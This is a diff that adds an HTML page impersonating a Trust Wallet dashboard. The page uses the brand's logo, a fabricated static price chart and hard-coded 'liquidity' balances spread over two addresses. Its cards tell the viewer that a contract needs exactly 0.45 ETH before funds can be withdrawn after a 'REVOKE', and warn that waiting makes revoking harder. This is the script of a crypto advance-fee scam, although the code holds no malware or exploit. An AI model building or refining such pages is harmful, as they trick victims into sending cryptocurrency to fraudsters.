@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Trust Wallet Style Dashboard</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #F0F4F8;
+      color: #1F2937;
+    }
+
+    .wallet-mock {
+      width: 360px;
+      margin: 30px auto;
+      background: #FFFFFF;
+      border-radius: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      overflow: hidden;
+      border: 1px solid #E5E7EB;
+    }
+
+    .top-bar {
+      background: #1E88E5;
+      color: white;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+    }
+    .top-bar img {
+      height: 28px;
+      margin-right: 12px;
+    }
+    .top-bar h1 {
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+
+    .content {
+      padding: 16px;
+    }
+
+    .price-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 16px;
+    }
+    .price-label {
+      font-size: 0.9rem;
+      color: #6B7280;
+    }
+    .eth-price {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #047857;
+    }
+
+    .chart-area {
+      margin-bottom: 20px;
+    }
+    .chart-area canvas {
+      width: 100% !important;
+      height: 150px !important;
+    }
+
+    .card {
+      background: #F9FAFB;
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 16px;
+    }
+    .card h2 {
+      font-size: 1rem;
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: #374151;
+    }
+    .card p {
+      font-size: 0.93rem;
+      margin-bottom: 8px;
+      line-height: 1.4;
+    }
+    .highlight {
+      font-weight: 600;
+      color: #047857;
+    }
+    .usd-val {
+      font-weight: 500;
+      color: #6B7280;
+      margin-left: 6px;
+      font-size: 0.9rem;
+    }
+
+    .view-instr {
+      font-size: 0.85rem;
+      color: #4B5563;
+      background: #EFF2F7;
+      border-left: 3px solid #1E88E5;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 12px;
+    }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+
+  <div class="wallet-mock">
+    <div class="top-bar">
+      <!-- Replace with Trust Wallet logo -->
+      <img src="https://seeklogo.com/images/T/trust-wallet-shield-logo-vector-logo-60B784B3C6-seeklogo.com.png" alt="Trust Wallet Logo" />
+      <h1>Trust Wallet</h1>
+    </div>
+
+    <div class="content">
+      <div class="price-row">
+        <div class="price-label">ETH Price (USD)</div>
+        <div class="eth-price" id="ethPrice">--</div>
+      </div>
+
+      <div class="chart-area">
+        <canvas id="priceChart"></canvas>
+      </div>
+
+      <div class="card">
+        <h2>Reminder</h2>
+        <p>The smart contract requires <span class="highlight">exactly <span id="reqEth">0.45</span> ETH</span> <span id="reqUsd" class="usd-val"></span> to execute.</p>
+        <p>Sending less will cause the transaction to fail.</p>
+        <p>Make sure your wallet has sufficient ETH before initiating.</p>
+        <p>The longer your assets remain at the contract address, the more difficult <strong>revoking</strong> can become due to changes in contract state or external transactions.</p>
+      </div>
+
+      <div class="card">
+        <h2>Liquidity Status</h2>
+        <p>Total Liquidity Deposited: <span class="highlight" id="totalDep">1.600945134 ETH</span> <span id="depUsd" class="usd-val"></span></p>
+        <p>Total Liquidity Required: <span class="highlight">0.45 ETH</span> <span id="totReqUsd" class="usd-val"></span></p>
+        <p><strong>Note:</strong> You can only withdraw your liquidity after <strong>REVOKE</strong>.</p>
+      </div>
+
+      <div class="card">
+        <h2>Addresses Holding Liquidity</h2>
+        <p>0xABb8B6...86D3 → <span class="highlight">1.00945134 ETH</span> <span id="addr1" class="usd-val"></span></p>
+        <p>0xBB6bAcF...A0F → <span class="highlight">0.60395281 ETH</span> <span id="addr2" class="usd-val"></span></p>
+      </div>
+
+      <div class="view-instr">
+        <p><strong>To view balance on the contract:</strong></p>
+        <p>Open Trust Wallet on your device → Select your wallet → Scroll to the contract address → Tap <em>Refresh</em> to view the balance in the contract.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    async function fetchETHPrice() {
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+        const data = await res.json();
+        const price = data.ethereum.usd;
+        document.getElementById('ethPrice').innerText = '$' + price.toFixed(2);
+
+        const amounts = {
+          reqUsd: 0.45,
+          totReqUsd: 0.45,
+          depUsd: 1.600945134,
+          addr1: 1.00945134,
+          addr2: 0.60395281
+        };
+        for (const [elId, ethAmt] of Object.entries(amounts)) {
+          const el = document.getElementById(elId);
+          if (el) {
+            const usd = (ethAmt * price).toFixed(2);
+            el.textContent = `($${usd})`;
+          }
+        }
+      } catch (err) {
+        console.error('Error fetching ETH price:', err);
+      }
+    }
+
+    function drawChart() {
+      const ctx = document.getElementById('priceChart').getContext('2d');
+      new Chart(ctx, {
+        type: 'line',
+        data: {
+          labels: ['1h', '45m', '30m', '15m', 'Now'],
+          datasets: [{
+            label: 'ETH Price (USD)',
+            data: [2020, 2045, 2030, 2075, 2100],
+            borderColor: '#1E88E5',
+            backgroundColor: 'rgba(30, 136, 229, 0.2)',
+            tension: 0.3,
+            fill: true
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: { legend: { display: false } },
+          scales: {
+            x: { grid: { display: false } },
+            y: { grid: { color: '#E5E7EB' }, ticks: { color: '#6B7280' } }
+          }
+        }
+      });
+    }
+
+    window.addEventListener('load', () => {
+      fetchETHPrice();
+      drawChart();
+    });
+  </script>
+
+</body>
+</html>
